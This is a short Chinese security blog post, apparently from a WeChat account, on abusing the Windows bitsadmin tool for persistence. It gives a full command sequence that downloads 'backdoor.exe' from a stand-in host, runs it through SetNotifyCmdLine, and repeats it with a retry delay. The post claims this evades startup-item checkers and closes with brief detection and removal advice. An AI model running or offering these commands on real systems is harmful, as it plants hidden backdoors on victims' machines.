<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/jGc4okQPFo4ekL5w51hEXQ)

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

免责声明

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

Bitsadmin

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

Bitsadmin 是 Windows 操作系统中的一个命令行工具，用于创建下载或上传作业并监控它们的进度。一个作业可以包含多个文件。

Bitsadmin 是使用后台智能传输服务（BITS）的方式进行的，因此即使链接临时中断，文件传输也不会失败。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9CF6tYAKhIYoR8cwapIFn0iaibIJyRuSVPM7seia9IKm2qBws2lJAJAs3QD6UZAkb2PwnAECd75FiaLAQ/640?wx_fmt=png)

bitsadmin 工具用法示例：

```
bitsadmin /create myDownloadJob 
bitsadmin /addfile myDownloadJob https://example.com/file.zip C:\path\to\file.zip 
bitsadmin /resume myDownloadJob

```

上述示例会创建一个名为 “myDownloadJob” 的下载作业，将一个文件从指定的 URL 下载到本地指定路径，然后开始该作业。

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

复现

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

1.   Bitsadmin 可以允许用户执行 cmd 命令，因此可以利用这个特性来进行权限维持  
    
2.  首先构建好我们的 Bitsadmin 命令：
    

```
bitsadmin /create backdoor
bitsadmin /addfile backdoor "http://evil.exe/backdoor.exe"  "C:\1.exe"
bitsadmin /SetNotifyCmdLine backdoor C:\1.exe NUL
bitsadmin /SetMinRetryDelay "backdoor" 60 
bitsadmin /resume backdoor

```

3. 这一段命令的含义为：

*   创建作业，名为 backdoor
    
*   使用 addfile 将文件保存本地
    
*   使用 SetNotifyCmdLine 设定将执行的命令
    
*   使用 SetMinRetryDelay 定义时间回调（秒）
    
*   开始工作
    

4. 执行后即可等待上线  

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

防范

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

1.  建议直接删除该工具，因为绝大部分情况下不需要  
    
2.  这种方法可以绕过目前所有启动项检查工具，需要通过 bistamin 命令检测：  
    
    ```
    bitsadmin /list /allusers /verbose
    
    ```